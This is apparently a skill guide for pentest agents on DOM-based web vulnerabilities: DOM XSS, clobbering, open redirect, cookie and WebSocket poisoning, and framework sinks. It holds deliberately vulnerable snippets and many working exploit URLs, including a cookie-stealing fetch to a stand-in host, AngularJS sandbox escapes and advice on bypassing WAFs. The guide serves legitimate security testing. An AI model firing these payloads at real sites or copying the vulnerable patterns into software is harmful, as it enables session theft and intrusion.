---
name: dom-based-vulnerabilities
description: "Client-side vulnerability hunting through source-to-sink taint analysis — DOM XSS, DOM clobbering, client-side open redirect, cookie and storage manipulation, WebSocket URL poisoning, client-side SQL/XPath/JSON injection, and framework sinks (dangerouslySetInnerHTML, v-html, ng-bind-html, jQuery selector injection). Use when testing SPAs, jQuery legacy apps, chat widgets, or OAuth callback pages that read location.hash — and whenever a payload needs to bypass a server-side WAF entirely, since fragment sources never reach the server."
---

# DOM-Based Vulnerabilities

## Crown Jewel Targets

- **SPAs (React, Angular, Vue)** -- heavy client-side routing means more source-to-sink paths; `dangerouslySetInnerHTML`, `v-html`, `ng-bind-html` are prime sinks
- **jQuery-based legacy apps** -- `$(location.hash)` in jQuery < 3.0 treats hash as HTML selector = instant XSS. Huge attack surface in enterprise apps
- **Chat/messaging widgets** -- `postMessage` handlers without origin checks feed attacker data into innerHTML sinks
- **OAuth callback pages** -- `location.hash` contains tokens, often passed to unsafe sinks for processing
- **Collaborative editing tools** (Google Docs clones) -- DOM clobbering via user-injected HTML that survives sanitization (DOMPurify allows `id`/`name`)
- **Real-time dashboards with WebSocket** -- WebSocket URL from `location.hash` = MitM on all streamed data
- **Search pages with instant results** -- query from URL reflected into DOM without encoding, especially in autocomplete dropdowns

## Attack Surface Signals

- **URL patterns**: `#callback`, `?next=`, `?redirect=`, `?q=`, `?search=`, `?template=`, fragment-based routing (`#/path`)
- **JS indicators**: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `eval(`, `innerHTML`, `document.write`
- **Framework signals**: `ng-bind-html`, `dangerouslySetInnerHTML`, `v-html`, `$.html(`, `$.append(`
- **DOM Invader canary**: Enable DOM Invader in Burp embedded browser -- auto-detects source-to-sink paths

## Overview

DOM-based vulnerabilities occur when client-side JavaScript takes attacker-controlled input (sources) and passes it to dangerous functions (sinks) without proper validation. Unlike reflected/stored XSS, these never touch the server — the entire attack chain executes in the browser's DOM. This pattern covers the full spectrum of DOM-based vulns beyond just XSS: open redirects, cookie manipulation, WebSocket poisoning, DOM clobbering, and more.

## Sources (Attacker-Controlled Input)

| Source | Access Pattern | Notes |
|--------|---------------|-------|
| `location.hash` | `location.hash.substring(1)` | Fragment — not sent to server |
| `location.search` | `new URLSearchParams(location.search).get('x')` | Query string |
| `location.href` | Full URL including fragment | |
| `location.pathname` | Path component | |
| `document.referrer` | Previous page URL | Attacker controls if they link to target |
| `window.name` | `window.name` | Persists across navigations, attacker sets via `window.open` |
| `document.URL` | Full document URL | Similar to `location.href` |
| `document.documentURI` | Full document URI | |
| `postMessage` | `event.data` | Cross-origin, see `postmessage-exploitation.md` |
| `Web Storage` | `localStorage.getItem()` / `sessionStorage` | If attacker can write (via another vuln) |
| `IndexedDB` | `IDBRequest.result` | Same as above |
| `document.cookie` | If attacker can set cookies (cookie injection) | |

## Sinks (Dangerous Functions) by Impact Category

### Code Execution Sinks
```javascript
eval(SOURCE)
setTimeout(SOURCE, 0)
setInterval(SOURCE, 1000)
new Function(SOURCE)
window.execScript(SOURCE)       // IE legacy
element.onclick = SOURCE        // event handler assignment
element.setAttribute("onclick", SOURCE)
```

### HTML Injection / XSS Sinks
```javascript
element.innerHTML = SOURCE
element.outerHTML = SOURCE
document.write(SOURCE)
document.writeln(SOURCE)
element.insertAdjacentHTML("beforeend", SOURCE)
Range.createContextualFragment(SOURCE)
DOMParser.parseFromString(SOURCE, "text/html")
```

### Redirect / Navigation Sinks
```javascript
location = SOURCE
location.href = SOURCE
location.assign(SOURCE)
location.replace(SOURCE)
window.open(SOURCE)
```

### Cookie Manipulation Sinks
```javascript
document.cookie = SOURCE
```

### Resource Injection Sinks
```javascript
element.src = SOURCE            // script, iframe, img, video
element.href = SOURCE           // link, a, base
element.action = SOURCE         // form
element.formAction = SOURCE     // button
XMLHttpRequest.open("GET", SOURCE)
fetch(SOURCE)
$.ajax({url: SOURCE})
```

## Attack Vectors

### A. DOM-Based Open Redirect

```javascript
// VULNERABLE: location.hash → redirect
var target = location.hash.substring(1);
if (target) { window.location = target; }

// VULNERABLE: query param → redirect
var url = new URLSearchParams(location.search).get('next');
window.location.href = url;
```

**Exploit**:
```
https://target.com/page#https://evil.com
https://target.com/page?next=https://evil.com
https://target.com/page?next=javascript:alert(document.cookie)
```

**Escalation**: Chain into OAuth token theft — redirect_uri with DOM open redirect.

### B. DOM-Based Cookie Manipulation

```javascript
// VULNERABLE: URL param written to cookie
var lang = new URLSearchParams(location.search).get('lang');
document.cookie = "language=" + lang + "; path=/";
```

**Exploit**:
```
https://target.com/page?lang=en;%20SameSite=None;%20Secure
https://target.com/page?lang=en%0d%0aSet-Cookie:%20admin=true
```

**Impact**: Session fixation, CSRF bypass via SameSite override, authentication bypass.

### C. DOM-Based JavaScript Injection

```javascript
// VULNERABLE: eval() on URL input
var config = location.hash.substring(1);
eval('var settings = ' + config);

// VULNERABLE: setTimeout with string arg
var callback = new URLSearchParams(location.search).get('cb');
setTimeout(callback, 0);

// VULNERABLE: Function constructor
var fn = new URLSearchParams(location.search).get('fn');
new Function(fn)();
```

**Exploit**:
```
https://target.com/page#{"x":1};alert(document.cookie)//
https://target.com/page?cb=alert(document.cookie)
https://target.com/page?fn=fetch('https://evil.com/steal?c='+document.cookie)
```

### D. DOM-Based Document-Domain Manipulation

```javascript
// VULNERABLE: allows attacker to relax same-origin
var domain = new URLSearchParams(location.search).get('d');
document.domain = domain;
```

**Exploit**:
```
https://target.com/page?d=com
```
Sets `document.domain = "com"`, allowing any `.com` page (in a cooperating iframe) to access this page's DOM.

### E. DOM-Based WebSocket URL Poisoning

```javascript
// VULNERABLE: WebSocket URL from DOM source
var host = location.hash.substring(1) || 'wss://api.target.com';
var ws = new WebSocket(host + '/socket');
ws.onmessage = function(e) { displayData(e.data); };
```

**Exploit**:
```
https://target.com/page#wss://evil.com
```
All WebSocket data now routes through attacker's server — MitM on real-time data.

### F. DOM-Based Link Manipulation

```javascript
// VULNERABLE: anchor href from source
var back = document.referrer || location.hash.substring(1);
document.getElementById('back-link').href = back;
```

**Exploit**:
```
https://target.com/page#javascript:alert(document.cookie)
```
User clicks "back" link, executes JavaScript.

### G. DOM-Based AJAX Request Header Injection

```javascript
// VULNERABLE: user input in request header
var token = new URLSearchParams(location.search).get('token');
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/data');
xhr.setRequestHeader('Authorization', 'Bearer ' + token);
xhr.send();
```

**Exploit**:
```
https://target.com/page?token=x%0d%0aX-Injected:%20true
```
CRLF in header value — may enable request smuggling or header injection depending on browser handling.

### H. DOM-Based Local File-Path Manipulation

```javascript
// VULNERABLE: file path from source
var file = new URLSearchParams(location.search).get('template');
fetch('/templates/' + file).then(r => r.text()).then(t => render(t));
```

**Exploit**:
```
https://target.com/page?template=../../etc/passwd
https://target.com/page?template=../admin/config.json
```

### I. DOM-Based Client-Side SQL Injection (Web SQL)

```javascript
// VULNERABLE: Web SQL with user input
var search = new URLSearchParams(location.search).get('q');
db.transaction(function(tx) {
  tx.executeSql("SELECT * FROM products WHERE name LIKE '%" + search + "%'");
});
```

**Exploit**:
```
https://target.com/page?q=' UNION SELECT password FROM users--
```
Note: Web SQL is deprecated but still exists in Chromium browsers.

### J. DOM-Based HTML5 Storage Manipulation

```javascript
// VULNERABLE: storing unvalidated source input
var prefs = location.hash.substring(1);
localStorage.setItem('userPrefs', prefs);

// Later, another page reads and renders:
document.getElementById('widget').innerHTML = localStorage.getItem('userPrefs');
```

**Exploit** (two-step):
```
Step 1: https://target.com/settings#<img src=x onerror=alert(1)>
Step 2: Navigate to https://target.com/dashboard (reads poisoned localStorage)
```

### K. DOM-Based XPath Injection

```javascript
// VULNERABLE: XPath with user input (rare but exists in XML-heavy apps)
var name = new URLSearchParams(location.search).get('name');
var result = document.evaluate(
  "//user[name='" + name + "']/email",
  xmlDoc, null, XPathResult.STRING_TYPE, null
);
```

**Exploit**:
```
https://target.com/page?name=' or '1'='1
```

### L. DOM-Based JSON Injection

```javascript
// VULNERABLE: building JSON from string concatenation
var name = new URLSearchParams(location.search).get('name');
var json = '{"user":"' + name + '","role":"viewer"}';
var obj = JSON.parse(json);
```

**Exploit**:
```
https://target.com/page?name=admin","role":"admin","x":"
```
Produces: `{"user":"admin","role":"admin","x":"","role":"viewer"}` — role becomes admin (first key wins in some parsers).

### M. DOM Clobbering

Override JavaScript globals by injecting HTML elements with specific `id` or `name` attributes.

#### How It Works
```html
<!-- This HTML clobbers window.config -->
<a id="config" href="javascript:alert(1)">
<!-- window.config now points to this <a> element -->
<!-- window.config.href = "javascript:alert(1)" -->
<!-- window.config.toString() = "javascript:alert(1)" -->

<!-- Clobber nested property: window.config.url -->
<form id="config"><input name="url" value="https://evil.com"></form>
<!-- window.config.url.value = "https://evil.com" -->

<!-- Clobber with named anchor (deep nesting) -->
<a id="config" name="url" href="https://evil.com">
<!-- In some browsers: window.config = HTMLCollection, window.config.url = this element -->
```

#### Exploitation Scenarios
```javascript
// Target code assumes 'defaultConfig' is defined in JS:
var endpoint = window.defaultConfig || {url: '/api/safe'};
fetch(endpoint.url);

// If attacker can inject HTML (via stored content, email HTML, etc.):
<a id="defaultConfig" href="https://evil.com/steal">

// Now: window.defaultConfig = <a> element
// endpoint.url = undefined, but endpoint.toString() = "https://evil.com/steal"
// fetch("https://evil.com/steal") — SSRF or data theft
```

#### DOM Clobbering + Sanitizer Bypass
DOMPurify and other sanitizers allow `id` and `name` attributes. Combine with:
```html
<!-- Clobber through DOMPurify (id/name pass sanitization) -->
<form id="x"><input id="y" name="z" value="payload"></form>
<!-- window.x.y = input element, window.x.z = input element -->
```

## Framework-Specific Patterns

### Angular
```html
<!-- VULNERABLE: ng-bind-html without $sce trust -->
<div ng-bind-html="userInput"></div>
<!-- If userInput from URL/hash and not sanitized by $sce -->

<!-- Angular expression injection (AngularJS 1.x) -->
https://target.com/page?name={{constructor.constructor('alert(1)')()}}

<!-- bypass sandbox (AngularJS < 1.6) -->
{{[].constructor.constructor('alert(document.cookie)')()}}
```

Detection:
```bash
grep -rniE "(ng-bind-html|ng-bind-html-unsafe|\$sce\.trustAsHtml|\$sce\.trustAs)" target_js/
grep -rniE "(angular\.module|ng-app)" target_js/
```

### React
```jsx
// VULNERABLE: dangerouslySetInnerHTML with user input
<div dangerouslySetInnerHTML={{__html: userControlledData}} />

// VULNERABLE: href with javascript: protocol
<a href={userInput}>Click</a>  // If userInput = "javascript:alert(1)"

// VULNERABLE: ref-based DOM manipulation
ref.current.innerHTML = userInput;
```

Detection:
```bash
grep -rniE "(dangerouslySetInnerHTML|\.innerHTML\s*=)" target_js/
grep -rniE "href=\{.*user|href=\{.*param|href=\{.*query" target_js/
```

### Vue
```html
<!-- VULNERABLE: v-html with user input -->
<div v-html="userInput"></div>

<!-- VULNERABLE: dynamic component rendering -->
<component :is="userControlledType"></component>

<!-- VULNERABLE: template compilation from user input -->
new Vue({ template: userInput })
```

Detection:
```bash
grep -rniE "(v-html=|v-html\s*=|\$compile|Vue\.compile)" target_js/
```

### jQuery
```javascript
// VULNERABLE: .html() with user input
$(selector).html(userInput);
$(selector).append(userInput);
$(selector).prepend(userInput);
$(selector).after(userInput);
$(selector).before(userInput);
$(selector).replaceWith(userInput);

// VULNERABLE: selector injection
$(location.hash);  // If hash = "#<img src=x onerror=alert(1)>"
// jQuery < 3.0 treats this as HTML if it starts with <

// VULNERABLE: $.globalEval
$.globalEval(userInput);
```

Detection:
```bash
grep -rniE "\.(html|append|prepend|after|before|replaceWith)\s*\(" target_js/
grep -rniE "\\\$\(.*location\.(hash|search|href)" target_js/
grep -rniE "globalEval" target_js/
```

## Detection Tools & Methodology

### DOM Invader (Burp Suite)
1. Open Burp's embedded Chromium browser
2. Enable DOM Invader extension from toolbar
3. Navigate target — auto-injects canary into all sources
4. **Sources tab**: shows all DOM sources detected
5. **Sinks tab**: shows which sinks the canary reached
6. Click any finding → auto-generates exploit URL

### Manual Taint Tracking
```javascript
// In browser DevTools console — trace a source to sinks
// Override getter to log access
Object.defineProperty(window, 'name', {
  get: function() {
    console.trace('window.name accessed');
    return this._name;
  },
  set: function(v) { this._name = v; }
});
```

### Playwright JS Analysis
```javascript
// Automated source→sink detection
await page.goto('https://target.com/page#CANARY123');
// Monitor console for canary appearance
page.on('console', msg => {
  if (msg.text().includes('CANARY123')) {
    console.log('Canary reached console at:', msg.location());
  }
});
// Monitor network for canary exfiltration
page.on('request', req => {
  if (req.url().includes('CANARY123')) {
    console.log('Canary in request to:', req.url());
  }
});
```

### Automated Source Grep
```bash
# Find all source reads in JS bundles
grep -rniE "(location\.(hash|search|href|pathname)|document\.(referrer|URL|documentURI|cookie)|window\.name|\.getItem\(|event\.data)" target_js/

# Find all dangerous sinks
grep -rniE "(\.innerHTML|\.outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|new Function|location\s*=|location\.href\s*=|location\.assign|location\.replace|window\.open|\.html\(|\.append\()" target_js/

# Cross-reference: find files with BOTH source reads and sink writes
# High-priority targets for manual review
```

### verify_dom_xss Tool (Pentest Agents)
```bash
# Mandatory for DOM XSS before reporting — injects canary, detects execution
headless browser DOM XSS verification --url "https://target.com/page" --param "q"
headless browser DOM XSS verification --urls '["https://target.com/page?q=test","https://target.com/search#test"]'
```

### N. DOM Data Manipulation

Attacker-controlled data flows into a DOM element that the page's own logic later reads as trusted state — no script execution required.

```javascript
// VULNERABLE: hidden field populated from the URL, later trusted server-side or by client logic
document.getElementById('userRole').value = new URLSearchParams(location.search).get('role');
```

Sinks include element `value`, `textContent`, `innerText`, `data-*` attributes, and `checked`/`selected` states. The impact depends entirely on what reads the value afterwards — if a form submission carries it back to the server, this is a client-side control bypass rather than a display quirk. Rate it by what the value governs, not by the fact that the DOM changed.

### O. DOM-Based Denial of Service

A source flowing into an expensive or self-referential sink hangs the tab.

```javascript
// VULNERABLE
document.getElementById('x').requestFullscreen(location.hash);   // engine-specific
new RegExp(location.hash.substring(1)).test(bigString);          // ReDoS from the URL
localStorage.setItem(location.hash, hugeValue);                  // storage exhaustion
```

Also reachable via `document.write` loops, cookie-jar overflow (`document.cookie` in a loop until the header exceeds the server limit, producing a persistent 431 for that user), and unbounded `postMessage` recursion. Severity is usually Low unless it persists across sessions — the cookie-jar variant does, which makes it the one worth reporting.

## Impact Requirements

**DOM-based vuln without exploitation = NOT reportable.** Must demonstrate:

| Finding | Required Proof | Severity |
|---------|---------------|----------|
| DOM XSS (eval/innerHTML sink) | `alert(document.cookie)` or session theft | High |
| DOM-based open redirect | Chain to OAuth token theft or phishing | Medium (standalone) / High (chained) |
| DOM clobbering → XSS | Full chain: HTML injection → clobber → script execution | High |
| DOM-based cookie manipulation | Session fixation or auth bypass proven | Medium-High |
| WebSocket URL poisoning | Data interception demonstrated | High |
| Client-side SQL injection | Data extraction from Web SQL DB | Medium |
| Storage manipulation → XSS | Persistent XSS via poisoned localStorage | High |
| JavaScript injection via eval | Code execution with cookie/token theft | High |

**NOT reportable:**
- Self-DOM-XSS (requires victim to paste payload in own console)
- Source identified but no exploitable sink reached
- Sink reached but output is HTML-encoded by framework
- DOM open redirect to same-origin URL only

## Triage Checklist

- [ ] Source identified and attacker-controllable (URL, referrer, postMessage, storage)
- [ ] Sink confirmed reachable from source (manual trace or DOM Invader)
- [ ] Exploitation proven in real browser (Playwright or Burp embedded browser)
- [ ] For DOM XSS: `verify_dom_xss` tool run with confirmed execution
- [ ] Framework-specific protections bypassed (Angular $sce, React escaping, Vue sanitization)
- [ ] Impact demonstrated beyond mere sink access (cookie theft, redirect, data exfil)
- [ ] Tested on latest Chrome/Firefox (not just legacy browsers)
- [ ] Self-XSS excluded: attack requires only attacker-controlled URL/input, no victim cooperation

## PortSwigger Academy — Advanced Techniques

- **DOM clobbering via anchor collection**: `<a id=someObject><a id=someObject name=url href=//evil.com/evil.js>` — clobbers `someObject.url`
- **Form+input clobbering to bypass sanitizers**: `<form onclick=alert(1)><input id=attributes>` — clobbers `element.attributes`, sanitizer skips attribute checks
- **window.name as persistent cross-origin source**: Persists across navigations, cross-origin readable
- **history.pushState/replaceState as sources**: Attacker-controllable, flows into sinks via `location.pathname`
- **postMessage exploitation without origin check**: `targetWindow.postMessage('{"url":"javascript:alert(1)"}', '*')`

## Operator Notes (Battle-Tested)

1. **DOM Invader (Burp) is the fastest detection tool** -- enable it in Burp's embedded Chromium, navigate the target, check Sources/Sinks tabs. It auto-injects canary values into all DOM sources and traces them to sinks. Faster than manual grep.
2. **verify_dom_xss MCP tool is mandatory before reporting** -- `headless browser DOM XSS verification --url URL --param PARAM`. This tool injects canary, detects execution in a real browser context. Manual Playwright verification is the fallback.
3. **Fragment-based payloads bypass server-side WAFs** -- `location.hash` content is never sent to the server. If the sink reads from hash, your payload completely bypasses any WAF/IDS. Always test `#<img/src=x/onerror=alert(1)>` first.
4. **jQuery selector injection in versions < 3.0 is still widespread** -- grep JS bundles for `$(location.hash)` or `$(window.location)`. If jQuery < 3.0, hash starting with `<` is treated as HTML, not CSS selector. Check `jQuery.fn.jquery` in console for version.
5. **DOM clobbering survives DOMPurify** -- DOMPurify allows `id` and `name` attributes. Inject `<a id=config href=//evil.com>` to clobber `window.config`. If JS code uses `window.config || defaults`, your element wins. Chain to SSRF or redirect.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Reflected/stored XSS, contexts, filter and CSP bypass | `xss-testing` |
| Prototype pollution gadget feeds a DOM sink | `prototype-pollution` |
| DOM open redirect found, chain to OAuth | `open-redirect` |
| WebSocket URL from DOM source | `websocket-testing` |
| postMessage handler without origin check | `postmessage-exploitation` |
| postMessage CSRF via DOM manipulation | `csrf-testing` |
| Hidden params that flow into DOM sinks | `hidden-param-discovery` |

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/self-xss-escalation.md` — **self xss escalation** — related_patterns: [postmessage-exploitation, csrf-advanced, oauth-token-theft-chain, dom-based-vulnerabilities
